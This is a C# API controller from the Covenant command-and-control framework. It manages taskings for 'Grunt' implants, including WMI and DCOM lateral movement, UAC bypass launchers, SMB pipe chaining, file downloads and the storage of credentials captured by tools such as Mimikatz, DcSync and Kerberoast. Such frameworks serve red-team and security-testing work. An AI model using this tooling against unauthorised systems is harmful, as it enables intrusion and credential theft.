// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using System.Collections.Generic;
using System.Threading.Tasks;

using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;

using Covenant.Core;
using Covenant.Models;
using Covenant.Models.Grunts;
using Covenant.Models.Launchers;
using Covenant.Models.Covenant;

namespace Covenant.Controllers
{
    [Authorize]
	[ApiController]
    [Route("api")]
    public class GruntTaskingController : Controller
    {
        private readonly CovenantContext _context;
        private readonly UserManager<CovenantUser> _userManager;

        public GruntTaskingController(CovenantContext context, UserManager<CovenantUser> userManager)
        {
            _context = context;
            _userManager = userManager;
        }

        private CovenantUser GetCurrentUser()
        {
            Task<CovenantUser> task = _userManager.GetUserAsync(HttpContext.User);
            task.Wait();
            return task.Result;
        }

        // GET: api/grunttaskings
        // <summary>
        // Get GruntTaskings
        // </summary>
        [HttpGet("grunttaskings", Name = "GetAllGruntTaskings")]
        public ActionResult<IEnumerable<GruntTasking>> GetAllGruntTaskings()
        {
            return _context.GruntTaskings.ToList();
        }

        // GET: api/grunts/{id}/taskings
        // <summary>
        // Get GruntTaskings
        // </summary>
        [HttpGet("grunts/{id}/taskings", Name = "GetGruntTaskings")]
        public ActionResult<IEnumerable<GruntTasking>> GetGruntTaskings(int id)
        {
            return _context.GruntTaskings.Where(GT => GT.GruntId == id).ToList();
        }

        // GET: api/grunts/{id}/taskings/search
        // <summary>
        // Get GruntTaskings for Grunt or any child Grunt
        // </summary>
        [HttpGet("grunts/{id}/taskings/search", Name = "GetSearchGruntTaskings")]
        public ActionResult<IEnumerable<GruntTasking>> GetSearchGruntTaskings(int id)
        {
            List<GruntTasking> search = new List<GruntTasking>();
            foreach (GruntTasking task in _context.GruntTaskings)
            {
                if (this.IsChildGrunt(id, task.GruntId))
                {
                    search.Add(task);
                }
            }
            return search;
        }

        // GET: api/grunts/{id}/taskings/uninitialized
        // <summary>
        // Get uninitialized GruntTaskings for Grunt
        // </summary>
        [HttpGet("grunts/{id}/taskings/uninitialized", Name = "GetUninitializedGruntTaskings")]
        public ActionResult<IEnumerable<GruntTasking>> GetUninitializedGruntTaskings(int id)
        {
            return _context.GruntTaskings
                .Where(GT => GT.GruntId == id && GT.Status == GruntTaskingStatus.Uninitialized)
                .ToList();
        }

        // GET: api/grunts/{id}/taskings/search/uninitialized
        // <summary>
        // Get uninitialized GruntTaskings for Grunt or any child Grunt
        // </summary>
        [HttpGet("grunts/{id}/taskings/search/uninitialized", Name = "GetSearchUninitializedGruntTaskings")]
        public ActionResult<IEnumerable<GruntTasking>> GetSearchUninitializedGruntTaskings(int id)
        {
            List<GruntTasking> uninitializedTasks = _context.GruntTaskings.Where(GT => GT.Status == GruntTaskingStatus.Uninitialized).ToList();
            List<GruntTasking> search = new List<GruntTasking>();
            foreach (GruntTasking task in uninitializedTasks)
            {
                if (this.IsChildGrunt(id, task.GruntId))
                {
                    search.Add(task);
                }
            }
            return search;
        }

        // GET api/grunts/{id}/taskings/{taskname}
        // <summary>
        // Get a GruntTasking
        // </summary>
        [HttpGet("grunts/{id}/taskings/{taskname}", Name = "GetGruntTasking")]
        public ActionResult<GruntTasking> GetGruntTasking(int id, string taskname)
        {
            Grunt grunt = _context.Grunts.FirstOrDefault(G => G.Id == id);
            if (grunt == null)
            {
                return NotFound($"NotFound - Grunt with id: {id}");
            }
            GruntTasking gruntTasking = _context.GruntTaskings.FirstOrDefault(GT => GT.GruntId == grunt.Id && GT.Name == taskname);
            if (gruntTasking == null)
            {
                return NotFound($"NotFound - GruntTasking with TaskName: {taskname}");
            }
            return gruntTasking;
        }

        // POST api/grunts/{id}/taskings
        // <summary>
        // Create a GruntTasking
        // </summary>
        [HttpPost("grunts/{id}/taskings", Name = "CreateGruntTasking")]
        [ProducesResponseType(typeof(GruntTasking), 201)]
        public ActionResult<GruntTasking> CreateGruntTasking(int id, [FromBody] GruntTasking gruntTasking)
        {
            Grunt grunt = _context.Grunts.FirstOrDefault(G => G.Id == id);
            if (grunt == null)
            {
                return NotFound($"NotFound - Grunt with id: {id}");
            }
            CovenantUser taskingUser = this.GetCurrentUser();
            if (taskingUser == null)
            {
                return NotFound($"NotFound - CovenantUser");
            }
            gruntTasking.TaskingUser = taskingUser.UserName;
            gruntTasking.TaskingTime = DateTime.UtcNow;
            if (gruntTasking.Type == GruntTaskingType.Assembly)
            {
                GruntTask task = _context.GruntTasks.Include(T => T.Options).FirstOrDefault(T => T.Id == gruntTasking.TaskId);
                if (task == null)
                {
                    return NotFound($"NotFound - GruntTask with id: {gruntTasking.TaskId}");
                }
                List<string> parameters = task.Options.Select(O => O.Value).ToList();
                if (task.Name.ToLower() == "wmigrunt")
                {
                    Launcher l = _context.Launchers.FirstOrDefault(L => L.Name.ToLower() == parameters[1].ToLower());
                    if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                    {
                        return NotFound($"NotFound - Launcher with name: {parameters[1]}");
                    }
                    else
                    {
                        parameters[1] = l.LauncherString;
                    }
                }
                else if (task.Name.ToLower() == "dcomgrunt")
                {
                    Launcher l = _context.Launchers.FirstOrDefault(L => L.Name.ToLower() == parameters[1].ToLower());
                    if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                    {
                        return NotFound($"NotFound - Launcher with name: {parameters[1]}");
                    }
                    else
                    {
                        // Add .exe exetension if needed
                        List<string> split = l.LauncherString.Split(" ").ToList();
                        parameters[1] = split.FirstOrDefault();
                        if (!parameters[1].EndsWith(".exe")) { parameters[1] += ".exe"; }

                        // Add command parameters
                        split.RemoveAt(0);
                        parameters.Insert(2, String.Join(" ", split.ToArray()));
                        string Directory = "C:\\WINDOWS\\System32\\";
                        if (parameters[1].ToLower() == "powershell.exe") { Directory += "WindowsPowerShell\\v1.0\\"; }
                        else if (parameters[1].ToLower() == "wmic.exe") { Directory += "wbem\\"; }

                        parameters.Insert(3, Directory);
                    }
                }
                else if (task.Name.ToLower() == "dcomcommand")
                {
                    // Add .exe exetension if needed
                    List<string> split = parameters[1].Split(" ").ToList();
                    parameters[1] = split[0];
                    if (!parameters[1].EndsWith(".exe")) { parameters[1] += ".exe"; }

                    // Add command parameters
                    split.RemoveAt(0);
                    parameters.Insert(2, String.Join(" ", split.ToArray()));
                    string Directory = "C:\\WINDOWS\\System32\\";
                    if (parameters[1].ToLower() == "powershell.exe") { Directory += "WindowsPowerShell\\v1.0\\"; }
                    else if (parameters[1].ToLower() == "wmic.exe") { Directory += "wbem\\"; }

                    parameters.Insert(3, Directory);
                }
                else if (task.Name.ToLower() == "bypassuacgrunt")
                {
                    Launcher l = _context.Launchers.FirstOrDefault(L => L.Name.ToLower() == parameters[0].ToLower());
                    if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                    {
                        return NotFound($"NotFound - Launcher with name: {parameters[0]}");
                    }
                    else
                    {
                        // Add .exe exetension if needed
                        string[] split = l.LauncherString.Split(" ");
                        if (!parameters[0].EndsWith(".exe")) { parameters[0] += ".exe"; }

                        // Add parameters need for BypassUAC Task
                        string ArgParams = String.Join(" ", split.ToList().GetRange(1, split.Count() - 1));
                        string Directory = "C:\\WINDOWS\\System32\\";
                        if (parameters[0].ToLower() == "powershell.exe") { Directory += "WindowsPowerShell\\v1.0\\"; }
                        else if (parameters[0].ToLower() == "wmic.exe") { Directory += "wbem\\"; }

                        parameters.Add(ArgParams);
                        parameters.Add(Directory);
                        parameters.Add("0");
                    }
                }
                else if (task.Name.ToLower() == "bypassuaccommand")
                {
                    // Add .exe exetension if needed
                    string[] split = parameters[0].Split(" ");
                    if (!parameters[0].EndsWith(".exe")) { parameters[0] += ".exe"; }

                    // Add parameters need for BypassUAC Task
                    string ArgParams = String.Join(" ", split.ToList().GetRange(1, split.Count() - 1));
                    string Directory = "C:\\WINDOWS\\System32\\";
                    if (parameters[0].ToLower() == "powershell.exe") { Directory += "WindowsPowerShell\\v1.0\\"; }
                    else if (parameters[0].ToLower() == "wmic.exe") { Directory += "wbem\\"; }

                    parameters.Add(ArgParams);
                    parameters.Add(Directory);
                    parameters.Add("0");
                }
                try
                {
                    gruntTasking.Compile(task, grunt, parameters);
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine("Task Compilation failed: " + e.Message + e.StackTrace);
                    return BadRequest("Task returned compilation errors:" + e.Message + e.StackTrace);
                }
            }
            else if (gruntTasking.Type == GruntTaskingType.Connect)
            {
                string hostname = gruntTasking.GruntTaskingMessage.Message.Split(",")[0];
                string pipename = gruntTasking.GruntTaskingMessage.Message.Split(",")[1];
                if (hostname == "localhost" || hostname == "127.0.0.1")
                {
                    hostname = grunt.Hostname;
                }
                gruntTasking.TaskingMessage = hostname + "," + pipename;
            }
            _context.GruntTaskings.Add(gruntTasking);
            _context.Events.Add(new Event
            {
                Time = gruntTasking.TaskingTime,
                MessageHeader = "[" + gruntTasking.TaskingTime + " UTC] Grunt: " + grunt.Name + " has " + "been assigned " + " GruntTasking: " + gruntTasking.Name,
                MessageBody = "(" + gruntTasking.TaskingUser + ") > " + gruntTasking.TaskingCommand,
                Level = Event.EventLevel.Highlight,
                Context = grunt.Name
            });
            _context.SaveChanges();
            return CreatedAtRoute(nameof(GetGruntTasking), new { id = id, taskname = gruntTasking.Name }, gruntTasking);
        }

        // PUT api/grunts/{id}/taskings/{taskname}
        // <summary>
        // Edit a GruntTasking
        // </summary>
        [HttpPut("grunts/{id}/taskings/{taskname}", Name = "EditGruntTasking")]
        public ActionResult<GruntTasking> EditGruntTasking(int id, string taskname, [FromBody] GruntTasking gruntTasking)
        {
            Grunt grunt = _context.Grunts.FirstOrDefault(G => G.Id == id);
            if (grunt == null)
            {
                return NotFound($"NotFound - Grunt with id: {id}");
            }
            GruntTasking updatingGruntTasking = _context.GruntTaskings.FirstOrDefault(GT => grunt.Id == GT.GruntId && taskname == GT.Name);
            if (updatingGruntTasking == null)
            {
                return NotFound($"NotFound - GruntTasking with taskname: {taskname}");
            }
            GruntTask gruntTask = _context.GruntTasks.FirstOrDefault(G => G.Id == gruntTasking.TaskId);
            if (gruntTask == null)
            {
                return NotFound($"NotFound - GruntTask with id: {gruntTasking.TaskId}");
            }
            GruntTask DownloadTask = _context.GruntTasks.FirstOrDefault(GT => GT.Name == "Download");
            if (DownloadTask == null)
            {
                return NotFound($"NotFound - GruntTask DownloadTask");
            }

            List<String> credTaskNames = new List<string> { "Mimikatz", "SamDump", "LogonPasswords", "DcSync", "Rubeus", "Kerberoast" };
            if (credTaskNames.Contains(gruntTask.Name))
            {
                List<CapturedCredential> capturedCredentials = CapturedCredential.ParseCredentials(gruntTasking.GruntTaskOutput);
                foreach (CapturedCredential cred in capturedCredentials)
                {
                    if (!ContextContainsCredentials(cred))
                    {
                        _context.Credentials.Add(cred);
                        _context.SaveChanges();
                    }
                }
            }

            GruntTaskingStatus newStatus = gruntTasking.Status;
            GruntTaskingStatus originalStatus = updatingGruntTasking.Status;
            if ((originalStatus == GruntTaskingStatus.Tasked || originalStatus == GruntTaskingStatus.Progressed) &&
                newStatus == GruntTaskingStatus.Completed)
            {
                if (gruntTasking.Type == GruntTaskingType.Kill)
                {
                    grunt.Status = Grunt.GruntStatus.Killed;
                }
                else if (gruntTasking.Type == GruntTaskingType.SetDelay || gruntTasking.Type == GruntTaskingType.SetJitter || gruntTasking.Type == GruntTaskingType.SetConnectAttempts)
                {
                    bool parsed = int.TryParse(gruntTasking.TaskingMessage, out int n);
                    if (parsed)
                    {
                        if (gruntTasking.Type == GruntTaskingType.SetDelay)
                        {
                            grunt.Delay = n;
                        }
                        else if (gruntTasking.Type == GruntTaskingType.SetJitter)
                        {
                            grunt.Jitter = n;
                        }
                        else if (gruntTasking.Type == GruntTaskingType.SetConnectAttempts)
                        {
                            grunt.ConnectAttempts = n;
                        }
                    }
                }
                else if (gruntTasking.Type == GruntTaskingType.Connect)
                {
                    if (originalStatus == GruntTaskingStatus.Tasked)
                    {
                        // Check if this Grunt was already connected
                        string hostname = gruntTasking.GruntTaskingMessage.Message.Split(",")[0];
                        string pipename = gruntTasking.GruntTaskingMessage.Message.Split(",")[1];
                        Grunt previouslyConnectedGrunt = _context.Grunts.FirstOrDefault(G =>
                            G.CommType == Grunt.CommunicationType.SMB &&
                            (G.IPAddress == hostname || G.Hostname == hostname) &&
                            G.SMBPipeName == pipename &&
                            (G.Status == Grunt.GruntStatus.Disconnected || G.Status == Grunt.GruntStatus.Lost || G.Status == Grunt.GruntStatus.Active)
                        );
                        if (previouslyConnectedGrunt != null)
                        {
                            if (previouslyConnectedGrunt.Status != Grunt.GruntStatus.Disconnected)
                            {
                                // If already connected, disconnect to avoid cycles
                                Grunt previouslyConnectedGruntPrevParent = null; 
                                foreach (Grunt g in _context.Grunts)
                                {
                                    if (g.Children.Contains(previouslyConnectedGrunt.GUID))
                                    {
                                        previouslyConnectedGruntPrevParent = g;
                                    }
                                }
                                if (previouslyConnectedGruntPrevParent != null)
                                {
                                    previouslyConnectedGruntPrevParent.RemoveChild(previouslyConnectedGrunt);
                                    _context.Grunts.Update(previouslyConnectedGruntPrevParent);
                                }
                            }

                            // Connect to tasked Grunt, no need to "Progress", as Grunt is already staged
                            grunt.AddChild(previouslyConnectedGrunt);
                            previouslyConnectedGrunt.Status = Grunt.GruntStatus.Active;
                            _context.Grunts.Update(previouslyConnectedGrunt);
                        }
                        else
                        {
                            // If not already connected, the Grunt is going to stage, set status to Progressed
                            newStatus = GruntTaskingStatus.Progressed;
                        }
                    }
                    else if (originalStatus == GruntTaskingStatus.Progressed)
                    {
                        // Connecting Grunt has staged, add as Child
                        string hostname = gruntTasking.GruntTaskingMessage.Message.Split(",")[0];
                        string pipename = gruntTasking.GruntTaskingMessage.Message.Split(",")[1];
                        Grunt stagingGrunt = _context.Grunts.FirstOrDefault(G =>
                            G.CommType == Grunt.CommunicationType.SMB &&
                            ((G.IPAddress == hostname || G.Hostname == hostname) || (G.IPAddress == "" && G.Hostname == "")) &&
                            G.SMBPipeName == pipename &&
                            G.Status == Grunt.GruntStatus.Stage0
                        );
                        if (stagingGrunt == null)
                        {
                            return NotFound($"NotFound - Grunt staging from {hostname}:{pipename}");
                        }
                        grunt.AddChild(stagingGrunt);
                    }
                }
                else if (gruntTasking.Type == GruntTaskingType.Disconnect)
                {
                    Grunt disconnectFromGrunt = _context.Grunts.FirstOrDefault(G => G.GUID == gruntTasking.GruntTaskingMessage.Message);
                    if (disconnectFromGrunt == null)
                    {
                        return NotFound($"NotFound - Grunt with GUID: {gruntTasking.GruntTaskingMessage.Message}");
                    }

                    disconnectFromGrunt.Status = Grunt.GruntStatus.Disconnected;
                    _context.Grunts.Update(disconnectFromGrunt);
                    grunt.RemoveChild(disconnectFromGrunt);
                }
            }

            if ((newStatus == GruntTaskingStatus.Completed || newStatus == GruntTaskingStatus.Progressed) && originalStatus != newStatus)
            {
                if (newStatus == GruntTaskingStatus.Completed)
                {
                    updatingGruntTasking.CompletionTime = DateTime.UtcNow;
                }
                string verb = newStatus == GruntTaskingStatus.Completed ? "completed" : "progressed";
                if (gruntTasking.TaskId == DownloadTask.Id)
                {
                    _context.Events.Add(new Event
                    {
                        Time = updatingGruntTasking.CompletionTime,
                        MessageHeader = "[" + updatingGruntTasking.CompletionTime + " UTC] Grunt: " + grunt.Name + " has " + verb + " GruntTasking: " + gruntTasking.Name,
                        Level = Event.EventLevel.Highlight,
                        Context = grunt.Name
                    });
                    string FileName = Common.CovenantEncoding.GetString(Convert.FromBase64String(gruntTasking.TaskingMessage.Split(",")[1]));
                    DownloadEvent downloadEvent = new DownloadEvent
                    {
                        Time = updatingGruntTasking.CompletionTime,
                        MessageHeader = "Downloaded: " + FileName + "\r\n" + "Syncing to Elite...",
                        Level = Event.EventLevel.Highlight,
                        Context = grunt.Name,
                        FileName = FileName,
                        FileContents = gruntTasking.GruntTaskOutput,
                        Progress = DownloadEvent.DownloadProgress.Complete
                    };
                    downloadEvent.WriteToDisk();
                    _context.Events.Add(downloadEvent);
                }
                else
                {
                    _context.Events.Add(new Event
                    {
                        Time = updatingGruntTasking.CompletionTime,
                        MessageHeader = "[" + updatingGruntTasking.CompletionTime + " UTC] Grunt: " + grunt.Name + " has " + verb + " GruntTasking: " + gruntTasking.Name,
                        MessageBody = "(" + gruntTasking.TaskingUser + ") > " + gruntTasking.TaskingCommand + Environment.NewLine + gruntTasking.GruntTaskOutput,
                        Level = Event.EventLevel.Highlight,
                        Context = grunt.Name
                    });
                }
            }

            updatingGruntTasking.Status = newStatus;
            updatingGruntTasking.GruntTaskOutput = gruntTasking.GruntTaskOutput;
            _context.GruntTaskings.Update(updatingGruntTasking);
            _context.Grunts.Update(grunt);
            _context.SaveChanges();

            return updatingGruntTasking;
        }

        // DELETE api/grunts/{id}/taskings/{task_name}
        // <summary>
        // Delete a GruntTasking
        // </summary>
        [HttpDelete("grunts/{id}/taskings/{taskname}", Name = "DeleteGruntTasking")]
        [ProducesResponseType(204)]
        public ActionResult DeleteGruntTasking(int id, string taskname)
        {
            GruntTasking removingGruntTasking = _context.GruntTaskings.FirstOrDefault(GT => id == GT.GruntId && GT.Name == taskname);
            if (removingGruntTasking == null)
            {
                return NotFound($"NotFound - GruntTasking with id: {id} and TaskName: {taskname}");
            }

            _context.GruntTaskings.Remove(removingGruntTasking);
            _context.SaveChanges();

            return new NoContentResult();
        }

        private bool IsChildGrunt(int ParentId, int ChildId)
        {
            if (ParentId == ChildId)
            {
                return true;
            }
            Grunt parentGrunt = _context.Grunts.FirstOrDefault(G => G.Id == ParentId);
            Grunt childGrunt = _context.Grunts.FirstOrDefault(G => G.Id == ChildId);
            if (parentGrunt == null || childGrunt == null)
            {
                return false;
            }
            if (parentGrunt.Children.Contains(childGrunt.GUID))
            {
                return true;
            }
            foreach (string child in parentGrunt.Children)
            {
                Grunt directChild = _context.Grunts.FirstOrDefault(G => G.GUID == child);
                if (IsChildGrunt(directChild.Id, ChildId))
                {
                    return true;
                }
            }
            return false;
        }

        private bool ContextContainsCredentials(CapturedCredential cred)
        {
            switch (cred.Type)
            {
                case CapturedCredential.CredentialType.Password:
                    CapturedPasswordCredential passcred = (CapturedPasswordCredential)cred;
                    return _context.Credentials.Where(C => C.Type == CapturedCredential.CredentialType.Password)
                                   .Select(C => (CapturedPasswordCredential)C)
                                   .FirstOrDefault(PC =>
                                       PC.Type == passcred.Type &&
                                       PC.Domain == passcred.Domain &&
                                       PC.Username == passcred.Username &&
                                       PC.Password == passcred.Password
                                   ) != null;
                case CapturedCredential.CredentialType.Hash:
                    CapturedHashCredential hashcred = (CapturedHashCredential)cred;
                    return _context.Credentials.Where(C => C.Type == CapturedCredential.CredentialType.Hash)
                                   .Select(C => (CapturedHashCredential)C)
                                   .FirstOrDefault(PC =>
                                       PC.Type == hashcred.Type &&
                                       PC.Domain == hashcred.Domain &&
                                       PC.Username == hashcred.Username &&
                                       PC.Hash == hashcred.Hash &&
                                       PC.HashCredentialType == hashcred.HashCredentialType
                                   ) != null;
                case CapturedCredential.CredentialType.Ticket:
                    CapturedTicketCredential ticketcred = (CapturedTicketCredential)cred;
                    return _context.Credentials.Where(C => C.Type == CapturedCredential.CredentialType.Ticket)
                                   .Select(C => (CapturedTicketCredential)C)
                                   .FirstOrDefault(PC =>
                                       PC.Type == ticketcred.Type &&
                                       PC.Domain == ticketcred.Domain &&
                                       PC.Username == ticketcred.Username &&
                                       PC.Ticket == ticketcred.Ticket &&
                                       PC.TicketCredentialType == ticketcred.TicketCredentialType
                                   ) != null;
                default:
                    return _context.Credentials.FirstOrDefault(P =>
                                       P.Type == cred.Type &&
                                       P.Domain == cred.Domain &&
                                       P.Username == cred.Username
                                   ) != null;
            }
        }
    }
}
